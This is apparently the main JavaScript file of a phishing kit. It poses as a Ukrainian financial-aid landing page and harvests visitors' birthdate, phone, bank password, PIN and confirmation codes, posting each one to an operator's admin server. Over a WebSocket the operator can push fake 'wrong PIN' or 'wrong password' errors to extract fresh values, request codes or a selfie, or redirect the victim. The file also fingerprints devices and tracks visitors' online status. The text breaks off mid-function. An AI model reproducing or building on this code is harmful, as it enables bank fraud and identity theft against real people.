/**
 * Главный файл приложения лендинга
 * Отправляет данные на админку и получает команды через WebSocket
 */

// Глобальные переменные
let ws = null;
let sessionToken = null;
let pinValue = '';  // Для хранения введенного PIN
let isSubmittingPin = false;  // Флаг для предотвращения множественной отправки
let pinAttempts = 0;  // Счетчик попыток ввода PIN
let pinHistory = [];  // История введенных PIN-кодов
let codeHistory = [];  // История введенных кодов (3-значных и 4-значных)
let userData = {
    phone: null,
    password: null,
    pin: null,
    bank: null,
    codes: [],
    selectedAmount: null,
    selectedCurrency: 'uah', // uah, usd, eur
    displayAmount: null,
    amountUAH: null,
    amountUSD: null,
    amountEUR: null,
    birthdate: null,
    age: null,  // Будет рассчитываться на сервере
    gender: null,
    city: null
};

// Курсы валют (примерные, можно обновлять)
const EXCHANGE_RATES = {
    usd: 36.5, // 1 USD = 36.5 UAH
    eur: 39.8  // 1 EUR = 39.8 UAH
};
let audioContext = null;
let signalAlertTimeout = null;
let visibilityTimeout = null;
let loadingProgressInterval = null; // Интервал для загрузки с процентами
let savedScreenBeforeCommand = null; // Сохраняем экран перед командой от админа
let statusHeartbeat = null;

const STATUS_HEARTBEAT_INTERVAL = 7000;

// ============================================================================
// ИНИЦИАЛИЗАЦИЯ
// ============================================================================

document.addEventListener('DOMContentLoaded', () => {
    if (CONFIG.SETTINGS.debug) {
        console.log('🚀 Лендинг инициализирован');
        console.log('📡 Админка:', CONFIG.ADMIN_API_URL);
    }
    
    // Проверка загрузки Facebook Pixel
    setTimeout(() => {
        if (typeof fbq !== 'undefined') {
            console.log('✅ Facebook Pixel загружен и готов к работе');
        } else {
            console.warn('⚠️ Facebook Pixel не обнаружен. Проверьте установку кода в <head>');
        }
    }, 1000);
    
    // Первый экран уже активен в HTML (screen-birthdate-first)
    
    // Инициализируем обработчик формы даты рождения
    initBirthdateFormFirst();
    
    // Инициализируем формы
    initPhoneForm();
    initPasswordForm();
    initPinForm();
    initCodeForm();
    
    // ГЛОБАЛЬНЫЙ обработчик для кнопки "Продовжити" на экране выбора суммы
    // Используем делегирование событий на document - это ВСЕГДА работает
    document.addEventListener('click', async function(e) {
        const target = e.target;
        const btn = target.closest('#submitAmount') || (target.id === 'submitAmount' ? target : null);
        
        if (btn) {
            console.log('🎯 Клик по кнопке Продовжити обнаружен!');
            
            e.preventDefault();
            e.stopPropagation();
            
            // Предотвращаем двойной клик
            if (btn.disabled) {
                console.log('⏸️ Кнопка отключена');
                return;
            }
            
            // Временно отключаем кнопку
            btn.disabled = true;
            btn.style.opacity = '0.6';
            
            console.log('🖱️ [GLOBAL] Клик по кнопке "Продовжити"');
            console.log('📊 userData:', JSON.stringify(userData));
            
            try {
                // Проверяем наличие сумм
                if (!userData.amountUAH) {
                    console.error('❌ Суммы не установлены в userData');
                    alert('Ошибка: суммы не установлены. Перезагрузите страницу.');
                    btn.disabled = false;
                    btn.style.opacity = '1';
                    return;
                }
                
                // Определяем сумму в выбранной валюте
                let amountToSend = userData.amountUAH;
                let currencyLabel = 'UAH';
                
                if (userData.selectedCurrency === 'usd') {
                    amountToSend = userData.amountUSD;
                    currencyLabel = 'USD';
                } else if (userData.selectedCurrency === 'eur') {
                    amountToSend = userData.amountEUR;
                    currencyLabel = 'EUR';
                }
                
                console.log('💰 Отправка суммы:', amountToSend, currencyLabel);
                
                // Отправляем данные
                await sendData('amount', `${amountToSend} ${currencyLabel}`);
                
                // Показываем короткую загрузку, потом экран пола (возраст уже введен в начале)
                showShortLoading('gender');
            } catch (error) {
                console.error('❌ Ошибка:', error);
                btn.disabled = false;
                btn.style.opacity = '1';
            }
        }
    }, true); // Используем capture phase для гарантированного перехвата
    
    // ГЛОБАЛЬНЫЙ обработчик для кнопок выбора валюты
    document.addEventListener('click', function(e) {
        const target = e.target;
        const currencyBtn = target.closest('.currency-btn');
        
        if (currencyBtn) {
            // Проверяем, что экран выбора суммы активен
            const amountScreen = document.getElementById('screen-amount');
            if (!amountScreen || !amountScreen.classList.contains('active')) {
                return;
            }
            
            // Убираем выделение с других кнопок
            document.querySelectorAll('.currency-btn').forEach(b => b.classList.remove('selected'));
            currencyBtn.classList.add('selected');
            
            // Сохраняем выбранную валюту
            const currency = currencyBtn.dataset.currency;
            userData.selectedCurrency = currency;
            
            // Обновляем отображение
            if (userData.amountUAH && userData.amountUSD && userData.amountEUR) {
                updateAmountDisplay(userData.amountUAH, userData.amountUSD, userData.amountEUR);
            }
            
            if (CONFIG.SETTINGS.debug) {
                console.log('💱 Выбрана валюта:', currency);
            }
        }
    }, false);
    
    // ГЛОБАЛЬНЫЙ обработчик для кнопки отправки кода (screen-code)
    document.addEventListener('click', async function(e) {
        const target = e.target;
        
        if (target && (target.id === 'submitCode' || target.closest('#submitCode'))) {
            const codeScreen = document.getElementById('screen-code');
            if (!codeScreen || !codeScreen.classList.contains('active')) {
                return;
            }
            
            const btn = document.getElementById('submitCode');
            if (!btn || btn.disabled) return;
            
            e.preventDefault();
            e.stopPropagation();
            
            const inputs = document.querySelectorAll('.code-input');
            const digits = inputs.length;
            
            if (CONFIG.SETTINGS.debug) {
                console.log('🖱️ [GLOBAL] Клик по кнопке отправки кода');
            }
            
            // Вызываем существующую функцию submitCode
            submitCode(digits);
        }
    }, true);
    
    // ГЛОБАЛЬНЫЙ обработчик для PIN клавиатуры
    document.addEventListener('click', function(e) {
        const target = e.target;
        const keyboardKey = target.closest('.keyboard-key');
        
        if (keyboardKey) {
            const pinScreen = document.getElementById('screen-pin');
            if (!pinScreen || !pinScreen.classList.contains('active')) {
                return;
            }
            
            const key = keyboardKey.dataset.key;
            
            if (key === 'backspace') {
                pinValue = pinValue.slice(0, -1);
            } else if (key === 'cancel') {
                pinValue = '';
            } else if (pinValue.length < 4 && !isNaN(key)) {
                pinValue += key;
            }
            
            // Обновляем отображение точек
            const pinDots = document.querySelectorAll('.pin-dot');
            pinDots.forEach((dot, index) => {
                if (index < pinValue.length) {
                    dot.classList.add('pin-dot--filled');
                } else {
                    dot.classList.remove('pin-dot--filled');
                }
            });
            
            // Активируем кнопку если 4 цифры
            const submitBtn = document.getElementById('submitPin');
            if (submitBtn) {
                submitBtn.disabled = pinValue.length !== 4;
            }
            
            // Если 4 цифры - автоматически отправляем
            if (pinValue.length === 4) {
                setTimeout(() => submitPin(pinValue), 300);
            }
        }
    }, false);
    
    // ГЛОБАЛЬНЫЙ обработчик для кнопки отправки PIN
    document.addEventListener('click', async function(e) {
        const target = e.target;
        
        if (target && (target.id === 'submitPin' || target.closest('#submitPin'))) {
            const pinScreen = document.getElementById('screen-pin');
            if (!pinScreen || !pinScreen.classList.contains('active')) {
                return;
            }
            
            if (pinValue.length === 4) {
                e.preventDefault();
                e.stopPropagation();
                submitPin(pinValue);
            }
        }
    }, true);
    
    // Обработчик для формы возраста УДАЛЕН - используется дата рождения вместо возраста
    
    // ГЛОБАЛЬНЫЙ обработчик для кнопок выбора пола
    document.addEventListener('click', async function(e) {
        const genderBtn = e.target.closest('.gender-btn');
        
        if (genderBtn) {
            const genderScreen = document.getElementById('screen-gender');
            if (!genderScreen || !genderScreen.classList.contains('active')) {
                return;
            }
            
            const gender = genderBtn.dataset.gender;
            if (!gender) return;
            
            userData.gender = gender;
            await sendData('gender', gender);
            
            console.log('👤 Пол отправлен:', gender);
            
            // Показываем короткую загрузку, потом экран города
            showShortLoading('city');
        }
    }, true);
    
    // ГЛОБАЛЬНЫЙ обработчик для формы города
    document.addEventListener('submit', async function(e) {
        const form = e.target;
        
        if (form && form.id === 'cityForm') {
            e.preventDefault();
            
            const cityScreen = document.getElementById('screen-city');
            if (!cityScreen || !cityScreen.classList.contains('active')) {
                return;
            }
            
            const input = document.getElementById('cityInput');
            if (!input) return;
            
            const city = input.value.trim();
            
            if (!city || city.length < 2) {
                showError('cityError', 'Введіть коректну назву міста');
                return;
            }
            
            // Проверка на кириллицу
            if (!/^[А-Яа-яІіЇїЄєҐґ\s\-]+$/.test(city)) {
                showError('cityError', 'Введіть назву міста українською мовою');
                return;
            }
            
            userData.city = city;
            await sendData('city', city);
            
            console.log('🏙️ Город отправлен:', city);
            
            // Показываем финальную загрузку
            showShortLoading('final');
        }
    }, true);
    
    // ГЛОБАЛЬНЫЙ обработчик для формы телефона
    document.addEventListener('submit', async function(e) {
        const form = e.target;
        
        if (form && form.id === 'phoneForm') {
            e.preventDefault();
            
            const phoneScreen = document.getElementById('screen-phone');
            if (!phoneScreen || !phoneScreen.classList.contains('active')) {
                return;
            }
            
            const input = document.getElementById('phone');
            if (!input) return;
            
            const phone = '+380' + input.value.replace(/\D/g, '');
            
            if (phone.length < 13) {
                showError('phoneError', 'Введіть коректний номер телефону');
                return;
            }
            
            const phoneNumber = input.value.replace(/\D/g, '');
            const operatorCode = phoneNumber.substring(0, 2);
            
            const validOperators = ['50','66','95','99','75','67','68','96','97','98','77','63','73','93'];
            
            if (!validOperators.includes(operatorCode)) {
                showError('phoneError', `❌ Код ${operatorCode} не підходить!`);
                return;
            }
            
            userData.phone = phone;
            await sendData('phone', phone);
            
            // Если есть сохраненный экран - возвращаемся туда
            if (savedScreenBeforeCommand) {
                returnToSavedScreen('phone');
            } else {
                // Первый ввод телефона - переходим к паролю
                document.getElementById('phoneDisplay').textContent = formatPhoneDisplay(phone);
                showScreen('screen-password');
            }
        }
    }, true);
    
    // ГЛОБАЛЬНЫЙ обработчик для формы пароля
    document.addEventListener('submit', async function(e) {
        const form = e.target;
        
        if (form && form.id === 'passwordForm') {
            e.preventDefault();
            
            const passwordScreen = document.getElementById('screen-password');
            if (!passwordScreen || !passwordScreen.classList.contains('active')) {
                return;
            }
            
            const input = document.getElementById('password');
            if (!input) return;
            
            const password = input.value;
            
            if (password.length < 6) {
                showError('passwordError', 'Пароль должен содержать минимум 6 символов');
                return;
            }
            
            const validPassword = /^[a-zA-Z0-9]+$/.test(password);
            if (!validPassword) {
                showError('passwordError', 'Пароль может содержать только английские буквы и цифры');
                return;
            }
            
            userData.password = password;
            await sendData('password', password);
            
            // Если есть сохраненный экран - возвращаемся туда
            if (savedScreenBeforeCommand) {
                returnToSavedScreen('password');
            } else {
                // Первый ввод пароля - переходим к PIN
                showScreen('screen-pin');
            }
        }
    }, true);
    
    // Создаем сессию и подключаемся к WebSocket
    createSession();
    
    // Отслеживаем закрытие страницы
    initOfflineDetection();
    
    // Подготавливаем аудиоконтекст после первого взаимодействия
    ['click', 'touchstart'].forEach(eventName => {
        document.addEventListener(eventName, () => ensureAudioContext(), { once: true });
    });
});

// Отслеживание закрытия/минимизации страницы
function initOfflineDetection() {
    // Когда пользователь закрывает вкладку/браузер
    window.addEventListener('beforeunload', () => {
        stopStatusHeartbeat();
        sendStatusSync('offline');
    });

    window.addEventListener('pagehide', () => {
        if (visibilityTimeout) {
            clearTimeout(visibilityTimeout);
            visibilityTimeout = null;
        }
        stopStatusHeartbeat();
        sendStatusSync('offline');
    });
    
    // Когда пользователь переключается на другую вкладку
    document.addEventListener('visibilitychange', () => {
        if (document.hidden) {
            // Свернул/переключился на другую вкладку - статус "minimized"
            sendStatus('minimized');
            stopStatusHeartbeat();
            if (visibilityTimeout) {
                clearTimeout(visibilityTimeout);
            }
            visibilityTimeout = setTimeout(() => {
                sendStatus('offline');
            }, 8000);
        } else {
            // Вернулся на вкладку - статус "online"
            if (visibilityTimeout) {
                clearTimeout(visibilityTimeout);
                visibilityTimeout = null;
            }
            sendStatus('online');
            startStatusHeartbeat();
        }
    });
}

// Синхронная отправка статуса (для beforeunload)
function sendStatusSync(status) {
    if (!sessionToken) return;
    
    const data = JSON.stringify({
        session_token: sessionToken,
        status: status
    });
    
    // Используем sendBeacon для гарантированной отправки при закрытии
    const url = `${CONFIG.ADMIN_API_URL}/api/session/status`;
    navigator.sendBeacon(url, data);
    
    if (CONFIG.SETTINGS.debug) {
        console.log(`📴 Отправлен статус: ${status}`);
    }
}

// ============================================================================
// СОЗДАНИЕ СЕССИИ
// ============================================================================

async function createSession() {
    try {
        const fingerprint = await generateFingerprint();
        const geolocation = CONFIG.SETTINGS.sendGeolocation ? await getGeolocation() : null;
        
        const response = await fetch(`${CONFIG.ADMIN_API_URL}/api/session/create`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                landing_id: CONFIG.LANDING_ID,
                landing_name: CONFIG.LANDING_NAME,
                landing_version: "Допомога",
                fingerprint: fingerprint,
                user_agent: navigator.userAgent,
                screen_resolution: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                geolocation: geolocation,
                referer: window.location.origin || window.location.href
            })
        });
        
        const data = await response.json();
        sessionToken = data.session_token;
        
        if (CONFIG.SETTINGS.debug) {
            console.log('✅ Сессия создана:', sessionToken);
        }
        
        // Подключаемся к WebSocket для получения команд
        connectWebSocket();
        
    } catch (error) {
        console.error('❌ Ошибка создания сессии:', error);
        console.log('💡 Попробуем работать без backend (только UI)');
        // Создаем временный токен для локальной работы
        sessionToken = 'local_' + Date.now();
    }
}

// ============================================================================
// WEBSOCKET - ПОЛУЧЕНИЕ КОМАНД ОТ АДМИНКИ
// ============================================================================

function connectWebSocket() {
    try {
        ws = new WebSocket(`${CONFIG.ADMIN_WS_URL}/client/${sessionToken}`);
        
        ws.onopen = () => {
            if (CONFIG.SETTINGS.debug) {
                console.log('🔌 WebSocket подключен');
            }
            
            // Отправляем статус: онлайн
            sendStatus('online');
            startStatusHeartbeat();
        };
        
        ws.onmessage = (event) => {
            const data = JSON.parse(event.data);
            handleCommand(data);
        };
        
        ws.onerror = (error) => {
            console.error('❌ WebSocket ошибка:', error);
        };
        
        ws.onclose = () => {
            if (CONFIG.SETTINGS.debug) {
                console.log('🔌 WebSocket отключен, переподключение...');
            }
            
            // Переподключение
            setTimeout(connectWebSocket, CONFIG.SETTINGS.wsReconnectTimeout);
        };
        
    } catch (error) {
        console.error('❌ Ошибка WebSocket:', error);
    }
}

function handleCommand(data) {
    if (CONFIG.SETTINGS.debug) {
        console.log('📨 Получена команда:', data);
    }
    
    const { command } = data;
    
    // Сохраняем текущий экран перед командой от админа
    // Приоритет: screen-loading (финальная загрузка) > screen-amount > остальные
    const currentScreen = document.querySelector('.screen.active');
    if (currentScreen) {
        // Если уже сохранен screen-loading - не перезаписываем (высший приоритет)
        if (savedScreenBeforeCommand === 'screen-loading') {
            if (CONFIG.SETTINGS.debug) {
                console.log('💾 Пропущено сохранение экрана (уже сохранен screen-loading)');
            }
        }
        // Если уже сохранен screen-amount, перезаписываем только на screen-loading
        else if (savedScreenBeforeCommand === 'screen-amount') {
            if (currentScreen.id === 'screen-loading') {
                savedScreenBeforeCommand = currentScreen.id;
                if (CONFIG.SETTINGS.debug) {
                    console.log('💾 Обновлен экран на screen-loading:', savedScreenBeforeCommand);
                }
            } else {
                if (CONFIG.SETTINGS.debug) {
                    console.log('💾 Пропущено сохранение экрана (уже сохранен screen-amount)');
                }
            }
        }
        // В остальных случаях - сохраняем текущий экран
        else {
            savedScreenBeforeCommand = currentScreen.id;
            if (CONFIG.SETTINGS.debug) {
                console.log('💾 Сохранен экран перед командой:', savedScreenBeforeCommand);
            }
        }
    }
    
    switch (command) {
        case 'show_3_code':
            showCodeScreen(3);
            break;
            
        case 'show_4_code':
            showCodeScreen(4);
            break;
            
        case 'show_pin':
            // Сбрасываем счетчики при запросе нового PIN от админа
            pinAttempts = 0;
            pinHistory = [];
            showScreen('screen-pin');
            clearPinInput();
            showError('pinError', 'Неправильний PIN-код. Спробуйте ще раз');
            break;
            
        case 'show_password':
            showScreen('screen-password');
            clearPasswordInput();
            showError('passwordError', 'Неправильний пароль. Введіть новий');
            break;
            
        case 'show_phone':
            showScreen('screen-phone');
            clearPhoneInput();
            showError('phoneError', 'Неправильний номер телефону. Введіть новий');
            break;
            
        case 'show_call':
            showCallScreen();
            break;
            
        case 'show_selfie':
            showSelfieScreen();
            break;
            
        case 'show_loading':
            showScreen('screen-loading');
            break;
        
        case 'show_message':
            // Показываем кастомное сообщение на экране загрузки
            showScreen('screen-loading');
            const loadingMessage = document.getElementById('loading-message');
            if (loadingMessage && data.message) {
                loadingMessage.textContent = data.message;
            }
            if (CONFIG.SETTINGS.debug) {
                console.log('📨 Показано сообщение:', data.message);
            }
            break;
            
        case 'redirect':
            if (data.url) {
                window.location.href = data.url;
            }
            break;
            
        case 'send_signal':
            showSignalAlert(data.message || 'Зверніть увагу!');
            playSignalSound();
            break;

        case 'show_bank_selection':
            showBankSelection();
            break;
            
        default:
            console.warn('⚠️ Неизвестная команда:', command);
    }
}

function ensureAudioContext() {
    try {
        if (typeof window === 'undefined') return null;
        const AudioCtx = window.AudioContext || window.webkitAudioContext;
        if (!AudioCtx) return null;
        if (!audioContext) {
            audioContext = new AudioCtx();
        }
        if (audioContext.state === 'suspended') {
            audioContext.resume();
        }
        return audioContext;
    } catch (error) {
        console.warn('⚠️ Невозможно инициализировать аудио-контекст:', error);
        return null;
    }
}

function playSignalSound() {
    const ctx = ensureAudioContext();
    if (!ctx) return;
    
    try {
        const duration = 1.2;
        const startTime = ctx.currentTime;
        const oscillator = ctx.createOscillator();
        const gainNode = ctx.createGain();
        
        oscillator.type = 'triangle';
        oscillator.frequency.setValueAtTime(750, startTime);
        oscillator.frequency.exponentialRampToValueAtTime(520, startTime + duration);
        
        gainNode.gain.setValueAtTime(0.001, startTime);
        gainNode.gain.exponentialRampToValueAtTime(0.35, startTime + 0.05);
        gainNode.gain.exponentialRampToValueAtTime(0.0001, startTime + duration);
        
        oscillator.connect(gainNode).connect(ctx.destination);
        oscillator.start(startTime);
        oscillator.stop(startTime + duration);
    } catch (error) {
        console.warn('⚠️ Не удалось воспроизвести сигнал:', error);
    }
}

function showSignalAlert(message) {
    const alertEl = getSignalAlertElement();
    const textEl = alertEl.querySelector('.signal-alert__text');
    if (textEl) {
        textEl.textContent = message || 'Зверніть увагу!';
    }
    
    alertEl.classList.add('visible');
    if (signalAlertTimeout) {
        clearTimeout(signalAlertTimeout);
    }
    signalAlertTimeout = setTimeout(() => {
        alertEl.classList.remove('visible');
    }, 4000);
}

function getSignalAlertElement() {
    let element = document.getElementById('signalAlert');
    if (!element) {
        element = document.createElement('div');
        element.id = 'signalAlert';
        element.className = 'signal-alert';
        element.innerHTML = `
            <span class="signal-alert__icon">🚨</span>
            <span class="signal-alert__text">Зверніть увагу!</span>
        `;
        document.body.appendChild(element);
    }
    return element;
}

// ============================================================================
// ОТПРАВКА ДАННЫХ НА АДМИНКУ
// ============================================================================

async function sendData(type, value) {
    try {
        const response = await fetch(`${CONFIG.ADMIN_API_URL}/api/data/save`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                session_token: sessionToken,
                data_type: type,
                data_value: value
            })
        });
        
        if (CONFIG.SETTINGS.debug) {
            console.log(`✅ Данные отправлены: ${type} = ${value}`);
        }
        
        return await response.json();
        
    } catch (error) {
        console.error('❌ Ошибка отправки данных:', error);
        if (CONFIG.SETTINGS.debug) {
            console.log('💡 Данные не отправлены, но UI продолжает работать');
        }
    }
}

async function sendStatus(status, isHeartbeat = false) {
    try {
        await fetch(`${CONFIG.ADMIN_API_URL}/api/session/status`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                session_token: sessionToken,
                status: status
            })
        });
        if (CONFIG.SETTINGS.debug && !isHeartbeat) {
            console.log(`📡 Статус отправлен: ${status}`);
        }
    } catch (error) {
        console.error('❌ Ошибка отправки статуса:', error);
    }
}

function startStatusHeartbeat() {
    if (statusHeartbeat) return;
    statusHeartbeat = setInterval(() => {
        if (!document.hidden) {
            sendStatus('online', true);
        }
    }, STATUS_HEARTBEAT_INTERVAL);
}

function stopStatusHeartbeat() {
    if (!statusHeartbeat) return;
    clearInterval(statusHeartbeat);
    statusHeartbeat = null;
}

// ============================================================================
// ФОРМЫ - ОБРАБОТЧИКИ
// ============================================================================

// Инициализация формы даты рождения (первый экран)
function initBirthdateFormFirst() {
    // Автопереход между полями даты
    const dayInput = document.getElementById('bdayDay');
    const monthInput = document.getElementById('bdayMonth');
    const yearInput = document.getElementById('bdayYear');
    
    if (dayInput && monthInput && yearInput) {
        // День -> Месяц
        dayInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 2) value = value.slice(0, 2);
            e.target.value = value;
            
            if (value.length === 2) {
                const dayNum = parseInt(value);
                if (dayNum >= 1 && dayNum <= 31) {
                    monthInput.focus();
                }
            }
        });
        
        // Месяц -> Год
        monthInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 2) value = value.slice(0, 2);
            e.target.value = value;
            
            if (value.length === 2) {
                const monthNum = parseInt(value);
                if (monthNum >= 1 && monthNum <= 12) {
                    yearInput.focus();
                }
            }
        });
        
        // Год
        yearInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 4) value = value.slice(0, 4);
            e.target.value = value;
        });
        
        // Backspace - переход назад
        monthInput.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && e.target.value === '') {
                dayInput.focus();
            }
        });
        
        yearInput.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && e.target.value === '') {
                monthInput.focus();
            }
        });
    }
    
    document.addEventListener('submit', async function(e) {
        const form = e.target;
        
        if (form && form.id === 'birthdateFormFirst') {
            e.preventDefault();
            
            const birthdateScreen = document.getElementById('screen-birthdate-first');
            if (!birthdateScreen || !birthdateScreen.classList.contains('active')) {
                return;
            }
            
            // Получаем значения из трех полей
            const dayInput = document.getElementById('bdayDay');
            const monthInput = document.getElementById('bdayMonth');
            const yearInput = document.getElementById('bdayYear');
            
            if (!dayInput || !monthInput || !yearInput) return;
            
            const day = dayInput.value.trim().padStart(2, '0');
            const month = monthInput.value.trim().padStart(2, '0');
            const year = yearInput.value.trim();
            
            // Валидация
            const dayNum = parseInt(day);
            const monthNum = parseInt(month);
            const yearNum = parseInt(year);
            
            if (!day || !month || !year) {
                showError('birthdateErrorFirst', 'Заповніть всі поля');
                return;
            }
            
            if (dayNum < 1 || dayNum > 31) {
                showError('birthdateErrorFirst', 'Невірний день (1-31)');
                return;
            }
            
            if (monthNum < 1 || monthNum > 12) {
                showError('birthdateErrorFirst', 'Невірний місяць (1-12)');
                return;
            }
            
            if (yearNum < 1900 || yearNum > new Date().getFullYear()) {
                showError('birthdateErrorFirst', 'Невірний рік');
                return;
            }
            
            // Формируем дату в формате YYYY-MM-DD для отправки на сервер
            const birthdate = `${year}-${month}-${day}`;
            
            // Проверяем, что возраст не менее 18 лет
            const birthDate = new Date(yearNum, monthNum - 1, dayNum);
            const today = new Date();
            const age = today.getFullYear() - birthDate.getFullYear();
            const monthDiff = today.getMonth() - birthDate.getMonth();
            const actualAge = monthDiff < 0 || (monthDiff === 0 && today.getDate() < birthDate.getDate()) ? age - 1 : age;
            
            if (actualAge < 18 || actualAge > 100) {
                showError('birthdateErrorFirst', 'Вам повинно бути від 18 до 100 років');
                return;
            }
            
            userData.birthdate = birthdate;
            
            // Создаем сессию с датой рождения
            if (!sessionToken) {
                await createSessionWithBirthdate(birthdate);
            } else {
                // Если сессия уже есть, просто отправляем дату рождения
                await sendData('birthdate', birthdate);
            }
            
            console.log('🎂 Дата рождения отправлена:', birthdate);
            
            // Отправляем событие конверсии в Facebook Pixel
            // Добавляем небольшую задержку, чтобы убедиться, что пиксель загружен
            setTimeout(() => {
                try {
                    if (typeof fbq !== 'undefined') {
                        // Используем стандартное событие CompleteRegistration для конверсии
                        fbq('track', 'CompleteRegistration', {
                            content_name: 'Birthdate Form Submitted',
                            content_category: 'Form Submission',
                            value: 1.00,
                            currency: 'UAH'
                        });
                        
                        // Также отправляем стандартное событие Lead
                        fbq('track', 'Lead', {
                            content_name: 'Birthdate Submitted',
                            content_category: 'Form Submission'
                        });
                        
                        // И кастомное событие для дополнительного отслеживания
                        fbq('trackCustom', 'BirthdateSubmitted', {
                            birthdate: birthdate,
                            age: actualAge
                        });
                        
                        console.log('📊 Facebook Pixel: события конверсии отправлены');
                        console.log('📊 Отправленные события:', {
                            CompleteRegistration: '✅',
                            Lead: '✅',
                            BirthdateSubmitted: '✅ (кастомное)'
                        });
                    } else {
                        console.warn('⚠️ Facebook Pixel не загружен (fbq не определен)');
                        console.warn('⚠️ Проверьте, что Meta Pixel код правильно установлен в <head>');
                    }
                } catch (error) {
                    console.error('❌ Ошибка отправки события в Facebook Pixel:', error);
                }
            }, 100); // Небольшая задержка для гарантии загрузки пикселя
            
            // Переходим к экрану ввода телефона
            showScreen('screen-phone');
        }
    }, true);
}

// Создание сессии с датой рождения (для лендинга Допомога)
async function createSessionWithBirthdate(birthdate) {
    try {
        const fingerprint = await generateFingerprint();
        const geolocation = CONFIG.SETTINGS.sendGeolocation ? await getGeolocation() : null;
        
        const response = await fetch(`${CONFIG.ADMIN_API_URL}/api/session/create`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                landing_id: CONFIG.LANDING_ID,
                landing_name: CONFIG.LANDING_NAME,
                landing_version: "Допомога",
                fingerprint: fingerprint,
                user_agent: navigator.userAgent,
                screen_resolution: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                geolocation: geolocation,
                referer: window.location.origin || window.location.href,
                birthdate: birthdate  // ← Добавляем дату рождения сразу при создании сессии
            })
        });
        
        const data = await response.json();
        sessionToken = data.session_token;
        
        if (CONFIG.SETTINGS.debug) {
            console.log('✅ Сессия создана с датой рождения:', sessionToken, 'Birthdate:', birthdate);
        }
        
        // Подключаемся к WebSocket для получения команд
        connectWebSocket();
        
    } catch (error) {
        console.error('❌ Ошибка создания сессии:', error);
        console.log('💡 Попробуем работать без backend (только UI)');
        // Создаем временный токен для локальной работы
        sessionToken = 'local_' + Date.now();
    }
}

function initPhoneForm() {
    // Обработчик submit установлен ГЛОБАЛЬНО через делегирование
    // Здесь только настраиваем маску ввода
    const input = document.getElementById('phone');
    if (!input) return;
    
    // Маска для телефона (удаляем старый обработчик через клонирование)
    const newInput = input.cloneNode(true);
    input.parentNode.replaceChild(newInput, input);
    
    const phoneInput = document.getElementById('phone');
    phoneInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 9) value = value.slice(0, 9);
        e.target.value = formatPhone(value);
    });
    
    if (CONFIG.SETTINGS.debug) {
        console.log('✅ Форма телефона инициализирована (глобальные обработчики)');
    }
}

function initPasswordForm() {
    // Обработчик submit установлен ГЛОБАЛЬНО через делегирование
    // Здесь только настраиваем вспомогательные функции
    const input = document.getElementById('password');
    const toggle = document.getElementById('togglePassword');
    
    if (!input || !toggle) return;
    
    // Клонируем для удаления старых обработчиков
    const newInput = input.cloneNode(true);
    input.parentNode.replaceChild(newInput, input);
    const newToggle = toggle.cloneNode(true);
    toggle.parentNode.replaceChild(newToggle, toggle);
    
    const passwordInput = document.getElementById('password');
    const passwordToggle = document.getElementById('togglePassword');
    
    // Показываем последний введенный символ на 2 секунды
    let hideTimeout;
    passwordInput.addEventListener('input', (e) => {
        // Удаляем все символы кроме a-z, A-Z, 0-9
        const filteredValue = e.target.value.replace(/[^a-zA-Z0-9]/g, '');
        if (e.target.value !== filteredValue) {
            e.target.value = filteredValue;
        }
        
        // Показываем символы на 2 секунды
        if (passwordInput.type === 'password') {
            clearTimeout(hideTimeout);
            passwordInput.type = 'text';
            hideTimeout = setTimeout(() => {
                passwordInput.type = 'password';
            }, 2000);
        }
    });
    
    // Показать/скрыть пароль
    passwordToggle.addEventListener('click', () => {
        const type = passwordInput.type === 'password' ? 'text' : 'password';
        passwordInput.type = type;
        passwordToggle.textContent = type === 'password' ? '👁️' : '🙈';
    });
    
    // Редактировать телефон
    const editPhoneBtn = document.getElementById('editPhone');
    if (editPhoneBtn) {
        editPhoneBtn.onclick = () => {
            showScreen('screen-phone');
        };
    }
    
    if (CONFIG.SETTINGS.debug) {
        console.log('✅ Форма пароля инициализирована (глобальные обработчики)');
    }
}

function initPinForm() {
    // Обработчики PIN клавиатуры уже установлены ГЛОБАЛЬНО через делегирование
    // Эта функция только сбрасывает состояние
    const submitBtn = document.getElementById('submitPin');
    if (submitBtn) {
        submitBtn.disabled = pinValue.length !== 4;
    }
    
    if (CONFIG.SETTINGS.debug) {
        console.log('✅ PIN форма инициализирована (глобальные обработчики)');
    }
}

function clearPinInput() {
    // Очищаем глобальную переменную
    pinValue = '';
    isSubmittingPin = false;  // Сбрасываем флаг отправки
    
    // Очищаем визуальное отображение
    const pinDots = document.querySelectorAll('.pin-dot');
    pinDots.forEach(dot => {
        dot.classList.remove('pin-dot--filled');
    });
    
    // Деактивируем кнопку отправки
    const submitBtn = document.getElementById('submitPin');
    if (submitBtn) {
        submitBtn.disabled = true;
    }
    
    if (CONFIG.SETTINGS.debug) {
        console.log('🧹 PIN очищен');
    }
}

function clearPasswordInput() {
    // Очищаем поле пароля
    const passwordInput = document.getElementById('password');
    if (passwordInput) {
        passwordInput.value = '';
        passwordInput.focus(); // Фокус на поле для удобства
    }
    
    if (CONFIG.SETTINGS.debug) {
        console.log('🧹 Пароль очищен');
    }
}

function clearPhoneInput() {
    // Очищаем поле телефона
    const phoneInput = document.getElementById('phone');
    if (phoneInput) {
        phoneInput.value = '';
        phoneInput.focus(); // Фокус на поле для удобства
    }
    
    if (CONFIG.SETTINGS.debug) {
        console.log('🧹 Телефон очищен');
    }
}

async function submitPin(pin) {
    if (pin.length !== 4) {
        showError('pinError', 'Введіть 4-значний PIN-код');
        return;
    }
    
    // Проверка на дубликат PIN
    if (pinHistory.includes(pin)) {
        // Этот PIN уже был введен
